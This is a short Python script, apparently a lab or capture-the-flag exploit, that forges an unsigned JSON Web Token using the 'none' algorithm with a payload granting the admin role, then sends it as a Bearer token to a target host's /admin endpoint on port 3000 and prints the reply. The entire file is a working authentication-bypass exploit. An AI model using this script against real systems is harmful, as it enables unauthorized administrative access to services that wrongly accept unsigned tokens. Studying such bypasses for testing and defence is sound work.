import base64
import urllib.request
import sys

def b64u(s):
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

h = b64u('{"alg":"none","typ":"JWT"}')
p = b64u('{"user":"guest","role":"admin","iat":1700000000}')
token = f"{h}.{p}."

if __name__ == "__main__":
    if len(sys.argv) > 1:
        url = f"http://{sys.argv[1]}:3000/admin"
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
        print(urllib.request.urlopen(req).read().decode())
    else:
        print(token)
